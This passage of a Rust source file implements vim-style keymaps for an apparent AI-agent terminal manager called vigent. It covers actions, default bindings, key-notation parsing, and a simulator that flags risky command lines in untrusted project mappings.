//! Vim-style keymaps, the same as src/keys.ts.
//!
//! Keys use vim notation: `j`, `gg`, `<C-d>`, `<S-Tab>`, `<M-x>`, `<CR>`,
//! `<Esc>`, `<Space>`, `<leader>`, `<F5>`. A mapping's right-hand side is one
//! of (or a list of):
//!
//!   "session.next"           an action (actions/: what each one does)
//!   ":colorscheme nord<CR>"  an ex command (without <CR>: opens the command line prefilled)
//!   "gg"                     other keys, replayed through the built-in keymap (like noremap)
//!   "<Nop>" or false         nothing: unbinds the key
//!
//! Like vim, a key that starts a longer mapping waits `timeoutlen` ms for the
//! rest ([`Sequencer`]); that is what makes `jk` = `<Esc>` in insert mode work.
//!
//! EXTENSION POINTS: a new action is a name + description in [`ACTIONS`]
//! (so mappings may name it) and a handler in actions/<area>.rs. A new default
//! key is a line in [`DEFAULT_KEYS`].

use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
use std::collections::{HashMap, HashSet};
use std::time::{Duration, Instant};

#[derive(Clone, Copy, PartialEq, Eq, Hash, Debug)]
pub enum KeyMode {
    Normal,
    Insert,
    Visual,
    Command,
}

pub const KEY_MODES: [KeyMode; 4] = [KeyMode::Normal, KeyMode::Insert, KeyMode::Visual, KeyMode::Command];

impl KeyMode {
    pub fn name(self) -> &'static str {
        match self {
            KeyMode::Normal => "normal",
            KeyMode::Insert => "insert",
            KeyMode::Visual => "visual",
            KeyMode::Command => "command",
        }
    }
    pub fn from_name(s: &str) -> Option<KeyMode> {
        KEY_MODES.into_iter().find(|m| m.name() == s)
    }
}

/// vigent's default <leader>, as in most Neovim configs (vim's own default is "\\")
pub const DEFAULT_LEADER: &str = "<Space>";

#[derive(Clone, Debug, PartialEq)]
pub enum Rhs {
    Action { name: String, arg: Option<String> },
    Ex { cmd: String, execute: bool },
    Keys(Vec<String>),
    Nop,
}

#[derive(Clone, Debug)]
pub struct Binding {
    /// canonical key sequence, e.g. ["<Space>", "t"]
    pub keys: Vec<String>,
    pub rhs: Vec<Rhs>,
    /// the right-hand side as written, for listings
    pub rhs_text: String,
    pub user: bool,
}

/// A mapping's right-hand side as config.toml (or :nmap) gives it.
#[derive(Clone, Debug, PartialEq)]
pub enum RhsValue {
    Str(String),
    Bool(bool),
    List(Vec<RhsValue>),
    Other,
}

// ---------------------------------------------------------------------------
// Actions
// ---------------------------------------------------------------------------

/// Every action a key can be mapped to, with what :help says about it.
pub const ACTIONS: &[(&str, &str)] = &[
    ("mode.normal", "back to NORMAL mode"),
    ("mode.insert", "write a prompt to the focused agent (INSERT)"),
    ("mode.insert_start", "write the prompt from its start"),
    ("mode.append_end", "write the prompt from its end"),
    ("mode.command", "open the : command line"),
    ("mode.search", "search the transcript"),
    ("mode.search_back", "search the transcript backward"),
    ("mode.visual", "select transcript lines (VISUAL)"),
    ("cursor.down", "move the VISUAL cursor down"),
    ("cursor.up", "move the VISUAL cursor up"),
    ("cursor.half_down", "move the VISUAL cursor down half a page"),
    ("cursor.half_up", "move the VISUAL cursor up half a page"),
    ("cursor.page_down", "move the VISUAL cursor down a page"),
    ("cursor.page_up", "move the VISUAL cursor up a page"),
    ("cursor.screen_top", "move the VISUAL cursor to the top of the window"),
    ("cursor.screen_middle", "move the VISUAL cursor to the middle of the window"),
    ("cursor.screen_bottom", "move the VISUAL cursor to the bottom of the window"),
    ("cursor.top", "move the VISUAL cursor to the top"),
    ("cursor.bottom", "move the VISUAL cursor to the bottom"),
    ("visual.yank", "copy the selection to the clipboard"),
    ("visual.inner_block", "select the code block under the cursor"),
    ("visual.swap", "jump to the other end of the selection"),
    ("visual.reselect", "select the last VISUAL selection again"),
    ("view.center", "the cursor line or search match to the middle (zz)"),
    ("view.top", "the cursor line or search match to the top (zt)"),
    ("view.bottom", "the cursor line or search match to the bottom (zb)"),
    ("jump.back", "back to where you were before a jump"),
    ("jump.forward", "forward again after <C-o> (<Tab> is <C-i>)"),
    ("app.position", "the agent's name and where you are in it (<C-g>)"),
    ("message.next", "jump to the next message"),
    ("message.prev", "jump to the previous message"),
    ("yank.reply", "copy the agent's last reply"),
    ("yank.block", "copy the nearest code block"),
    ("scroll.down", "scroll down one line"),
    ("scroll.up", "scroll up one line"),
    ("scroll.half_down", "scroll down half a page"),
    ("scroll.half_up", "scroll up half a page"),
    ("scroll.page_down", "scroll down a page"),
    ("scroll.page_up", "scroll up a page"),
    ("scroll.top", "jump to the top of the transcript"),
    ("scroll.bottom", "jump to the bottom of the transcript"),
    ("session.next", "next session"),
    ("session.prev", "previous session"),
    ("session.alternate", "last focused session"),
    ("session.tab", "next session, or session N with a count (3gt)"),
    ("session.goto", "session N (session.goto 3)"),
    ("session.new", "spawn a new agent"),
    ("session.kill", "kill the focused agent (asks first)"),
    ("session.abort", "stop the focused agent's current run"),
    ("session.pause", "pause the agent and hold its queued prompts"),
    ("session.resume", "resume a paused agent"),
    ("session.tree", "the conversation tree: go back to an earlier point"),
    ("sidebar.focus", "sessions sidebar: j/k pick an agent, Enter or Esc back"),
    ("window.vsplit", "split the window side by side (<C-w>v, :vsplit)"),
    ("window.split", "split the window, one above the other (<C-w>s, :split)"),
    ("window.close", "close this window (<C-w>c, :close)"),
    ("window.quit", "close this window, or quit if it's the last one (<C-w>q, :q)"),
    ("window.only", "close every other window (<C-w>o, :only)"),
    ("window.down", "the window below"),
    ("window.up", "the window above"),
    ("window.next", "the next window, the sidebar counts as one (<C-w>w)"),
    ("window.prev", "the previous window (<C-w>W)"),
    ("window.last", "the window you were in last (<C-w>p)"),
    ("window.top", "the first window (<C-w>t)"),
    ("window.bottom", "the last window (<C-w>b)"),
    ("window.equal", "make all windows the same size (<C-w>=)"),
    ("window.wider", "one column wider (<C-w>>)"),
    ("window.narrower", "one column narrower (<C-w><)"),
    ("window.taller", "one row taller (<C-w>+)"),
    ("window.shorter", "one row shorter (<C-w>-)"),
    ("window.max_width", "as wide as it can be (<C-w>|)"),
    ("window.max_height", "as tall as it can be (<C-w>_)"),
    ("window.exchange", "swap what this window and the one next to it show (<C-w>x)"),
    ("window.rotate", "swap the two halves of this split (<C-w>r)"),
    ("window.left", "the window to the left (like <C-w>h): the sessions sidebar, or the transcript when the sidebar is on the right"),
    ("window.right", "the window to the right (like <C-w>l): back to the transcript, or the sidebar when it's on the right; with nowhere to go, redraw"),
    ("fold.toggle", "fold / unfold tool output"),
    ("fold.open_all", "unfold all tool output"),
    ("fold.close_all", "fold all tool output"),
    ("search.next", "next search match"),
    ("search.prev", "previous search match"),
    ("search.clear", "clear search highlighting"),
    ("edit.submit", "send the prompt / run the command line"),
    ("edit.backspace", "delete the character before the cursor"),
    ("edit.delete_word", "delete the word before the cursor"),
    ("edit.clear", "delete everything before the cursor"),
    ("edit.delete", "delete the character under the cursor"),
    ("edit.left", "cursor one character left"),
    ("edit.right", "cursor one character right"),
    ("edit.home", "cursor to the start of the line"),
    ("edit.end", "cursor to the end of the line"),
    ("edit.word_left", "cursor one word left"),
    ("edit.word_right", "cursor one word right"),
    ("edit.history_prev", "the older line from history that starts with what's typed"),
    ("edit.history_next", "the newer line from history that starts with what's typed"),
    ("edit.paste", "insert what was last deleted or yanked in the line's NORMAL mode"),
    ("edit.normal", "edit the line in NORMAL mode: motions, operators, text objects, undo"),
    ("edit.complete", "complete the command, agent or theme; again for the next one"),
    ("edit.complete_prev", "the previous completion"),
    ("theme.picker", "pick a colorscheme"),
    ("app.help", "show all keys"),
    ("app.dashboard", "all agents at a glance"),
    ("app.redraw", "redraw the screen"),
    ("app.quit", "quit vigent (asks if agents are running)"),
    ("app.quit_force", "quit even if agents are running"),
    ("app.quit_hint", "explain how to quit"),
    ("noop", "do nothing"),
];

pub fn is_action(name: &str) -> bool {
    ACTIONS.iter().any(|(n, _)| *n == name)
}

/// The built-in keymap, in the same notation users write (src/keys.ts DEFAULT_KEYS).
pub fn default_keys(mode: KeyMode) -> Vec<(String, String)> {
    let pairs: &[(&str, &str)] = match mode {
        KeyMode::Normal => NORMAL_KEYS,
        KeyMode::Visual => VISUAL_KEYS,
        KeyMode::Insert => INSERT_KEYS,
        KeyMode::Command => COMMAND_KEYS,
    };
    let mut out: Vec<(String, String)> = pairs.iter().map(|(l, r)| (l.to_string(), r.to_string())).collect();
    if mode == KeyMode::Normal {
        // <leader>1..9: session.goto N (after gT/<C-^>, as in src/keys.ts)
        let at = out.iter().position(|(l, _)| l == "<C-^>").map(|i| i + 1).unwrap_or(out.len());
        for n in (1..=9).rev() {
            out.insert(at, (format!("<leader>{n}"), format!("session.goto {n}")));
        }
    }
    out
}

const NORMAL_KEYS: &[(&str, &str)] = &[
    ("i", "mode.insert"),
    ("a", "mode.insert"),
    ("o", "mode.insert"),
    (":", "mode.command"),
    ("/", "mode.search"),
    ("?", "mode.search_back"),
    ("v", "mode.visual"),
    ("V", "mode.visual"),
    ("j", "scroll.down"),
    ("<Down>", "scroll.down"),
    ("k", "scroll.up"),
    ("<Up>", "scroll.up"),
    ("<C-e>", "scroll.down"),
    ("<C-y>", "scroll.up"),
    ("<C-n>", "scroll.down"),
    ("<C-p>", "scroll.up"),
    ("<C-d>", "scroll.half_down"),
    ("<C-u>", "scroll.half_up"),
    ("<C-f>", "scroll.page_down"),
    ("<PageDown>", "scroll.page_down"),
    ("<C-b>", "scroll.page_up"),
    ("<PageUp>", "scroll.page_up"),
    ("gg", "scroll.top"),
    ("G", "scroll.bottom"),
    ("]s", "session.next"),
    ("[s", "session.prev"),
    ("gt", "session.tab"),
    ("gT", "session.prev"),
    ("<C-^>", "session.alternate"),
    ("za", "fold.toggle"),
    ("zR", "fold.open_all"),
    ("zM", "fold.close_all"),
    ("zr", "fold.open_all"),
    ("zm", "fold.close_all"),
    ("n", "search.next"),
    ("N", "search.prev"),
    ("{", "message.prev"),
    ("}", "message.next"),
    ("yy", "yank.reply"),
    ("yib", "yank.block"),
    ("dd", "session.kill"),
    ("<Esc>", "search.clear"),
    ("<C-c>", "session.abort"),
    ("<C-l>", "window.right"),
    ("<C-h>", "window.left"),
    // most terminals send <C-h> as Backspace (0x08): in NORMAL it means the same
    ("<BS>", "window.left"),
    ("<C-j>", "window.down"),
    ("<C-k>", "window.up"),
    ("<C-w>h", "window.left"),
    ("<C-w><C-h>", "window.left"),
    ("<C-w>l", "window.right"),
    ("<C-w><C-l>", "window.right"),
    ("<C-w>j", "window.down"),
    ("<C-w><C-j>", "window.down"),
    ("<C-w>k", "window.up"),
    ("<C-w><C-k>", "window.up"),
    ("<C-w>w", "window.next"),
    ("<C-w><C-w>", "window.next"),
    ("<C-w>W", "window.prev"),
    ("<C-w>p", "window.last"),
    ("<C-w><C-p>", "window.last"),
    ("<C-w>t", "window.top"),
    ("<C-w>b", "window.bottom"),
    ("<C-w>v", "window.vsplit"),
    ("<C-w><C-v>", "window.vsplit"),
    ("<C-w>s", "window.split"),
    ("<C-w>S", "window.split"),
    ("<C-w><C-s>", "window.split"),
    ("<C-w>c", "window.close"),
    ("<C-w>q", "window.quit"),
    ("<C-w><C-q>", "window.quit"),
    ("<C-w>o", "window.only"),
    ("<C-w><C-o>", "window.only"),
    ("<C-w>=", "window.equal"),
    ("<C-w>>", "window.wider"),
    ("<C-w><lt>", "window.narrower"),
    ("<C-w>+", "window.taller"),
    ("<C-w>-", "window.shorter"),
    ("<C-w>|", "window.max_width"),
    ("<C-w>_", "window.max_height"),
    ("<C-w>x", "window.exchange"),
    ("<C-w><C-x>", "window.exchange"),
    ("<C-w>r", "window.rotate"),
    ("<C-w><C-r>", "window.rotate"),
    ("<leader>|", "window.vsplit"),
    ("<leader>-", "window.split"),
    ("<leader>n", ":new "),
    ("<leader>d", ":diff<CR>"),
    ("<leader>m", ":merge<CR>"),
    ("<leader>p", ":pr<CR>"),
    ("<leader>q", ":queue "),
    ("<leader>t", "theme.picker"),
    ("<leader>D", ":dash<CR>"),
    ("<leader>u", "session.tree"),
    ("<leader>s", ":settings<CR>"),
    ("<leader>r", ":review<CR>"),
    ("<leader>T", ":templates<CR>"),
    ("<leader>M", ":model<CR>"),
    ("<leader>e", "sidebar.focus"),
    ("<leader>R", ":effort<CR>"),
    ("<leader>E", ":engine<CR>"),
    ("I", "mode.insert_start"),
    ("A", "mode.append_end"),
    ("zz", "view.center"),
    ("zt", "view.top"),
    ("zb", "view.bottom"),
    ("gv", "visual.reselect"),
    ("<C-o>", "jump.back"),
    ("<Tab>", "jump.forward"),
    ("<C-g>", "app.position"),
    ("ZZ", "app.quit"),
    ("ZQ", "app.quit_force"),
    ("q", "app.quit_hint"),
];

const VISUAL_KEYS: &[(&str, &str)] = &[
    ("j", "cursor.down"),
    ("<Down>", "cursor.down"),
    ("k", "cursor.up"),
    ("<Up>", "cursor.up"),
    ("<C-d>", "cursor.half_down"),
    ("<C-u>", "cursor.half_up"),
    ("<C-f>", "cursor.page_down"),
    ("<PageDown>", "cursor.page_down"),
    ("<C-b>", "cursor.page_up"),
    ("<PageUp>", "cursor.page_up"),
    ("H", "cursor.screen_top"),
    ("M", "cursor.screen_middle"),
    ("L", "cursor.screen_bottom"),
    ("gg", "cursor.top"),
    ("G", "cursor.bottom"),
    ("y", "visual.yank"),
    ("ib", "visual.inner_block"),
    ("o", "visual.swap"),
    ("zz", "view.center"),
    ("zt", "view.top"),
    ("zb", "view.bottom"),
    ("<Esc>", "mode.normal"),
    ("<C-c>", "mode.normal"),
    ("v", "mode.normal"),
    ("V", "mode.normal"),
];

const INSERT_KEYS: &[(&str, &str)] = &[
    ("<Esc>", "mode.normal"),
    ("<C-c>", "mode.normal"),
    ("<CR>", "edit.submit"),
    ("<BS>", "edit.backspace"),
    ("<C-h>", "edit.backspace"),
    ("<C-w>", "edit.delete_word"),
    ("<C-u>", "edit.clear"),
    ("<Del>", "edit.delete"),
    ("<Left>", "edit.left"),
    ("<Right>", "edit.right"),
    ("<Home>", "edit.home"),
    ("<End>", "edit.end"),
    ("<C-Left>", "edit.word_left"),
    ("<S-Left>", "edit.word_left"),
    ("<C-Right>", "edit.word_right"),
    ("<S-Right>", "edit.word_right"),
    ("<Up>", "edit.history_prev"),
    ("<Down>", "edit.history_next"),
    ("<C-r>\"", "edit.paste"),
    ("<C-f>", "edit.normal"),
];

const COMMAND_KEYS: &[(&str, &str)] = &[
    ("<Esc>", "mode.normal"),
    ("<C-c>", "mode.normal"),
    ("<CR>", "edit.submit"),
    ("<BS>", "edit.backspace"),
    ("<C-h>", "edit.backspace"),
    ("<C-w>", "edit.delete_word"),
    ("<C-u>", "edit.clear"),
    ("<Del>", "edit.delete"),
    ("<Left>", "edit.left"),
    ("<Right>", "edit.right"),
    ("<Home>", "edit.home"),
    ("<End>", "edit.end"),
    ("<C-Left>", "edit.word_left"),
    ("<S-Left>", "edit.word_left"),
    ("<C-Right>", "edit.word_right"),
    ("<S-Right>", "edit.word_right"),
    ("<Up>", "edit.history_prev"),
    ("<Down>", "edit.history_next"),
    ("<C-r>\"", "edit.paste"),
    ("<C-f>", "edit.normal"),
    ("<C-b>", "edit.home"),
    ("<C-e>", "edit.end"),
    ("<C-p>", "edit.history_prev"),
    ("<C-n>", "edit.history_next"),
    ("<Tab>", "edit.complete"),
    ("<S-Tab>", "edit.complete_prev"),
];

// ---------------------------------------------------------------------------
// Notation
// ---------------------------------------------------------------------------

fn named(lower: &str) -> Option<String> {
    let n = match lower {
        "space" => "Space",
        "tab" => "Tab",
        "cr" | "enter" | "return" => "CR",
        "esc" | "escape" => "Esc",
        "bs" | "backspace" => "BS",
        "del" | "delete" => "Del",
        "up" => "Up",
        "down" => "Down",
        "left" => "Left",
        "right" => "Right",
        "home" => "Home",
        "end" => "End",
        "pageup" => "PageUp",
        "pagedown" => "PageDown",
        "insert" => "Insert",
        f if f.len() >= 2 && f.starts_with('f') && f[1..].parse::<u8>().is_ok_and(|n| (1..=12).contains(&n)) => return Some(format!("F{}", &f[1..])),
        _ => return None,
    };
    Some(n.to_string())
}

/// A canonical token from modifiers (C, M, S, D) and a base key ("Space", "x", "F5").
pub fn token(mods: &[char], base: &str) -> String {
    let mut mods: Vec<char> = mods.to_vec();
    let has = |m: &Vec<char>, c: char| m.contains(&c);
    let mut key = base.to_string();
    let one = key.chars().count() == 1;
    if one && has(&mods, 'S') && !has(&mods, 'C') && !has(&mods, 'M') && !has(&mods, 'D') {
        mods.retain(|&c| c != 'S');
        key = key.to_uppercase();
    }
    if one && has(&mods, 'M') && !has(&mods, 'C') && key != key.to_lowercase() {
        // Alt keeps case apart, as <M-S-g>, so Esc-then-G stays G
        if !has(&mods, 'S') {
            mods.push('S');
        }
        key = key.to_lowercase();
    }
    if one && (has(&mods, 'C') || has(&mods, 'M')) {
        key = key.to_lowercase();
    }
    if mods.is_empty() {
        if key == "<" {
            return "<lt>".into();
        }
        return if key.chars().count() == 1 { key } else { format!("<{key}>") };
    }
    let order: String = ['C', 'M', 'S', 'D'].iter().filter(|m| mods.contains(m)).map(|m| format!("{m}-")).collect();
    format!("<{order}{}>", if key == "<" { "lt" } else { &key })
}

/// The inside of <...>; None if it isn't a key name (then `<` is literal).
fn parse_bracket(inner: &str) -> Option<String> {
    let lower = inner.to_lowercase();
    match lower.as_str() {
        "lt" => return Some("<lt>".into()),
        "bar" => return Some("|".into()),
        "bslash" => return Some("\\".into()),
        _ => {}
    }
    // leading modifiers: C- M- A- S- D-
    let mut mods = vec![];
    let mut rest = inner;
    loop {
        let b = rest.as_bytes();
        if b.len() > 2 && b[1] == b'-' && matches!(b[0].to_ascii_lowercase(), b'c' | b'm' | b'a' | b's' | b'd') {
            let m = b[0].to_ascii_uppercase() as char;
            mods.push(if m == 'A' { 'M' } else { m });
            rest = &rest[2..];
        } else {
            break;
        }
    }
    if let Some(n) = named(&rest.to_lowercase()) {
        return Some(token(&mods, &n));
    }
    if rest.eq_ignore_ascii_case("lt") {
        return Some(token(&mods, "<"));
    }
    if !mods.is_empty() && rest.chars().count() == 1 {
        return Some(token(&mods, rest));
    }
    None
}

/// Vim key notation as canonical tokens. `<leader>` expands to `leader`.
pub fn parse_keys(notation: &str, leader: &str) -> Result<Vec<String>, String> {
    let chars: Vec<char> = notation.chars().collect();
    let mut out = vec![];
    let mut i = 0;
    while i < chars.len() {
        let ch = chars[i];
        if ch == '<' {
            if let Some(close) = chars[i + 1..].iter().position(|&c| c == '>').map(|p| p + i + 1)
                && close > i + 1 {
                    let inner: String = chars[i + 1..close].iter().collect();
                    if inner.eq_ignore_ascii_case("leader") {
                        out.extend(parse_keys(leader, "\\")?);
                        i = close + 1;
                        continue;
                    }
                    if let Some(t) = parse_bracket(&inner) {
                        out.push(t);
                        i = close + 1;
                        continue;
                    }
                }
            out.push("<lt>".into());
            i += 1;
            continue;
        }
        out.push(if ch == ' ' { "<Space>".into() } else { ch.to_string() });
        i += 1;
    }
    if out.is_empty() {
        return Err("empty key sequence".into());
    }
    Ok(out)
}

/// A key press as a canonical token, or None if it isn't a key vigent reads.
pub fn token_from_event(k: &KeyEvent) -> Option<String> {
    let mut mods = vec![];
    if k.modifiers.contains(KeyModifiers::CONTROL) {
        mods.push('C');
    }
    if k.modifiers.contains(KeyModifiers::ALT) {
        mods.push('M');
    }
    if k.modifiers.contains(KeyModifiers::SHIFT) {
        mods.push('S');
    }
    if k.modifiers.contains(KeyModifiers::SUPER) {
        mods.push('D');
    }
    let base: String = match k.code {
        KeyCode::Char(' ') if mods.is_empty() || mods == ['S'] => return Some("<Space>".into()),
        KeyCode::Char(' ') => "Space".into(),
        // <C-6> is how many terminals report <C-^>
        KeyCode::Char('6' | '^') if mods == ['C'] || mods == ['C', 'S'] => return Some("<C-^>".into()),
        KeyCode::Char(c) => c.to_string(),
        KeyCode::Enter => "CR".into(),
        KeyCode::Esc => "Esc".into(),
        KeyCode::Backspace => "BS".into(),
        KeyCode::Delete => "Del".into(),
        KeyCode::Tab => "Tab".into(),
        KeyCode::BackTab => {
            if !mods.contains(&'S') {
                mods.push('S');
            }
            "Tab".into()
        }
        KeyCode::Up => "Up".into(),
        KeyCode::Down => "Down".into(),
        KeyCode::Left => "Left".into(),
        KeyCode::Right => "Right".into(),
        KeyCode::Home => "Home".into(),
        KeyCode::End => "End".into(),
        KeyCode::PageUp => "PageUp".into(),
        KeyCode::PageDown => "PageDown".into(),
        KeyCode::Insert => "Insert".into(),
        KeyCode::F(n) => format!("F{n}"),
        _ => return None,
    };
    // a shifted character is already the character
    if base.chars().count() == 1 && mods.len() == 1 && mods[0] == 'S' && !base.chars().next().unwrap().is_ascii_lowercase() {
        mods.clear();
    }
    Some(token(&mods, &base))
}

/// The text a token types in INSERT / command-line mode, if any.
pub fn token_text(t: &str) -> Option<String> {
    match t {
        "<Space>" => Some(" ".into()),
        "<lt>" => Some("<".into()),
        _ if t.chars().count() == 1 => Some(t.to_string()),
        _ => None,
    }
}

// ---------------------------------------------------------------------------
// Right-hand sides
// ---------------------------------------------------------------------------

/// The closest name, for "did you mean" (src/suggest.ts).
pub fn did_you_mean(word: &str, names: &[&str]) -> String {
    fn dist(a: &str, b: &str) -> usize {
        let (a, b): (Vec<char>, Vec<char>) = (a.chars().collect(), b.chars().collect());
        let mut prev: Vec<usize> = (0..=b.len()).collect();
        for i in 1..=a.len() {
            let mut cur = vec![i; b.len() + 1];
            for j in 1..=b.len() {
                cur[j] = (prev[j] + 1).min(cur[j - 1] + 1).min(prev[j - 1] + usize::from(a[i - 1] != b[j - 1]));
            }
            prev = cur;
        }
        prev[b.len()]
    }
    let best = names.iter().map(|n| (dist(word, n), *n)).min();
    match best {
        Some((d, n)) if d <= 3.max(word.len() / 3) => format!(" (did you mean '{n}'?)"),
        _ => String::new(),
    }
}

/// A mapping's right-hand side. Errors are readable messages.
pub fn parse_rhs(value: &RhsValue, leader: &str) -> Result<Vec<Rhs>, String> {
    match value {
        RhsValue::Bool(false) => return Ok(vec![Rhs::Nop]),
        RhsValue::List(items) if items.is_empty() => return Ok(vec![Rhs::Nop]),
        RhsValue::List(items) => {
            let mut out = vec![];
            for v in items {
                out.extend(parse_rhs(v, leader)?);
            }
            return Ok(out);
        }
        RhsValue::Str(s) if s.is_empty() || s.trim().eq_ignore_ascii_case("<nop>") => return Ok(vec![Rhs::Nop]),
        RhsValue::Str(_) => {}
        _ => return Err("should be an action, an ex command, keys, or false".into()),
    }
    let RhsValue::Str(value) = value else { unreachable!() };
    let v = value.trim();
    let lower = v.to_lowercase();
    // ":cmd<CR>" runs it; ":cmd " (no <CR>) opens the command line with that text, trailing space kept
    if v.starts_with(':') || lower.starts_with("<cmd>") {
        let start = value.trim_start();
        let body = if let Some(b) = start.strip_prefix(':') { b } else { &start[5..] };
        let bl = body.to_lowercase();
        let (cmd, cr) = ["<cr>", "<enter>", "<return>"].iter().find_map(|e| bl.ends_with(e).then(|| (&body[..body.len() - e.len()], true))).unwrap_or((body, false));
        let execute = cr || lower.starts_with("<cmd>");
        let cmd = if execute { cmd.trim().to_string() } else { cmd.trim_start().to_string() };
        return Ok(vec![Rhs::Ex { cmd, execute }]);
    }
    // an action: name.name [arg]
    let mut parts = v.splitn(2, char::is_whitespace);
    let name = parts.next().unwrap_or("");
    let arg = parts.next().map(str::trim).filter(|a| !a.is_empty() && !a.contains(char::is_whitespace));
    let looks = !name.is_empty() && name.split('.').count() <= 2 && name.chars().all(|c| c.is_ascii_lowercase() || c == '_' || c == '.') && !name.starts_with('.') && !name.ends_with('.');
    if looks && (parts.next().is_none() || arg.is_some()) && (name.contains('.') || name == "noop") {
        if !is_action(name) {
            let names: Vec<&str> = ACTIONS.iter().map(|(n, _)| *n).collect();
            return Err(format!("unknown action '{name}'{}", did_you_mean(name, &names)));
        }
        return Ok(vec![Rhs::Action { name: name.into(), arg: arg.map(str::to_string) }]);
    }
    Ok(vec![Rhs::Keys(parse_keys(v, leader)?)])
}

fn rhs_text(value: &RhsValue) -> String {
    match value {
        RhsValue::Bool(false) => "<Nop>".into(),
        RhsValue::Bool(true) => "true".into(),
        RhsValue::List(items) => items.iter().map(rhs_text).collect::<Vec<_>>().join(", "),
        RhsValue::Str(s) => s.clone(),
        RhsValue::Other => String::new(),
    }
}

// ---------------------------------------------------------------------------
// What a mapping runs (a project's [keys] wait for :trust when it's risky)
// ---------------------------------------------------------------------------

/// A command line a mapping runs (src/keys.ts CommandLine). `sure` is false
/// when the mapping edits the line in ways vigent doesn't follow (cursor
/// moves, history, completion, pasting): what runs is then unknown, and
/// counts as risky.
#[derive(Clone, Debug, PartialEq)]
pub struct CommandLine {
    pub text: String,
    pub sure: bool,
}

/// keys that run the command line
const SUBMIT_KEYS: [&str; 3] = ["<CR>", "<C-m>", "<C-j>"];
/// the same, typed out as text (`<NL>` has no key of its own, so it types itself)
const SUBMIT_TEXT: [&str; 6] = ["<cr>", "<enter>", "<return>", "<nl>", "<c-m>", "<c-j>"];

/// The next `<CR>` (or another key that runs the line) typed out as text in `s`, at or after byte `from`: (start, end).
fn submit_text(s: &str, from: usize) -> Option<(usize, usize)> {
    let lower = s.to_ascii_lowercase();
    (from..lower.len()).filter(|&i| lower.as_bytes()[i] == b'<').find_map(|i| SUBMIT_TEXT.iter().find(|t| lower[i..].starts_with(*t)).map(|t| (i, i + t.len())))
}

/// The command line as a mapping replays keys onto it (src/keys.ts mappingCommandLines).
struct LineSim {
    out: Vec<CommandLine>,
    /// "normal" (also VISUAL), "insert" or "line"
    at: &'static str,
    buf: String,
    /// the buffer is exactly `buf`, with the cursor at its end
    sure: bool,
    /// text vigent can't see comes before `buf` (a [keys.command] mapping's line)
    hidden: bool,
    /// how much of `buf` was looked at for <CR> typed out as text
    scanned: usize,
}

impl LineSim {
    fn enter(&mut self, text: &str) {
        self.at = "line";
        self.buf.clear();
        self.sure = true;
        self.hidden = false;
        self.scanned = 0;
        self.type_text(text);
    }
    fn submit(&mut self) {
        self.out.push(CommandLine { text: std::mem::take(&mut self.buf), sure: self.sure });
        self.at = "normal";
        self.sure = true;
        self.hidden = false;
        self.scanned = 0;
    }
    fn type_text(&mut self, text: &str) {
        self.buf.push_str(text);
        // <CR> typed out as text: count the line before it as run; past it, the line is unknown
        let mut from = self.buf[..self.scanned].char_indices().rev().take(7).last().map_or(self.scanned, |(i, _)| i);
        while let Some((start, end)) = submit_text(&self.buf, from) {
            if end > self.scanned {
                self.out.push(CommandLine { text: self.buf[..start].to_string(), sure: self.sure });
                self.sure = false;
            }
            from = end;
        }
        self.scanned = self.buf.len();
    }
    fn leave(&mut self) {
        // unsure where the line editor is (e.g. its NORMAL mode): stay on the line, so more is found
        if self.at == "line" && !self.sure {
            return;
        }
        self.at = "normal";
        self.buf.clear();
        self.scanned = 0;
    }
    fn backspace(&mut self) {
        if !self.sure {
            return; // keep the text
        }
        if self.buf.is_empty() {
            // vim: backspace on an empty line leaves it (unless there's text vigent can't see)
            if !self.hidden {
                self.leave();
            }
            return;
        }
        self.buf.pop();
        self.scanned = self.scanned.min(self.buf.len());
    }
    fn clear(&mut self) {
        if !self.sure {
            return;
        }
        self.buf.clear();
        self.hidden = false;
        self.scanned = 0;
    }
}

/// The command lines a mapping can run, simulated over its right-hand side the
/// way vigent replays it, erring on the side of finding one: `:` in NORMAL or
/// VISUAL opens the command line, text typed there adds to it, <CR> runs it.
/// A [keys.command] mapping starts on a line vigent can't see, so what it
/// types is taken as the whole line. (src/keys.ts mappingCommandLines)
pub fn mapping_command_lines(mode: KeyMode, rhs: &RhsValue, leader: &str) -> Vec<CommandLine> {
    let Ok(parts) = parse_rhs(rhs, leader) else {
        return vec![]; // never applied: build_keymap warns about it
    };
    let at = match mode {
        KeyMode::Insert => "insert",
        KeyMode::Command => "line",
        _ => "normal",
    };
    let mut sim = LineSim { out: vec![], at, buf: String::new(), sure: true, hidden: mode == KeyMode::Command, scanned: 0 };
    for part in &parts {
        match part {
            Rhs::Nop => {}
            Rhs::Ex { cmd, execute: true } => sim.out.push(CommandLine { text: cmd.clone(), sure: true }),
            Rhs::Ex { cmd, execute: false } => sim.enter(cmd),
            Rhs::Action { name, .. } => {
                let name = name.as_str();
                if name == "mode.command" {
                    sim.enter("");
                } else if sim.at == "line" {
                    match name {
                        "edit.submit" => sim.submit(),
                        "mode.normal" => sim.leave(),
                        "edit.backspace" => sim.backspace(),
                        "edit.clear" => sim.clear(),
                        "edit.delete" | "noop" => {}
                        _ => sim.sure = false,
                    }
                } else if sim.at == "insert" && name != "noop" {
                    sim.at = "normal";
                }
            }
            Rhs::Keys(keys) => {
                for key in keys {
                    let key = key.as_str();
                    let text = token_text(key);
                    if sim.at == "normal" {
                        if key == ":" {
                            sim.enter("");
                        }
                    } else if sim.at == "insert" {
                        // <Esc>, <C-[>, <CR> (the prompt is sent) or any other key: taken as back in NORMAL, where : opens the line
                        if text.is_none() {
                            sim.at = "normal";
                        }
                    } else if let Some(t) = text {
                        sim.type_text(&t);
                    } else if SUBMIT_KEYS.contains(&key) {
                        sim.submit();
                    } else if key == "<Esc>" || key == "<C-c>" {
                        sim.leave();
                    } else if key == "<BS>" || key == "<C-h>" {
                        sim.backspace();
                    } else if key == "<C-u>" {
                        sim.clear();
                    } else if key != "<Del>" {
                        sim.sure = false;
                    }
                }
            }
        }
    }
    sim.out
}

/// Why a command line is risky from an untrusted file (src/keys.ts LineRisk).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum LineRisk {
    /// `:!cmd`
    Shell,
    /// :command, :delcommand, :map and the rest, :normal, :execute, :source
    Defines,
    /// :trust, :permissions allow
    Trust,
    /// :w or :write with a file or ! (and :wq, :x)
    Write,
    /// :serve, except :serve stop
    Serve,
    /// one of your commands whose steps are risky
    Command,
    /// vigent can't tell what the line is
    Unknown,
}

impl LineRisk {
    pub fn name(self) -> &'static str {
        match self {
            LineRisk::Shell => "shell",
            LineRisk::Defines => "defines",
            LineRisk::Trust => "trust",
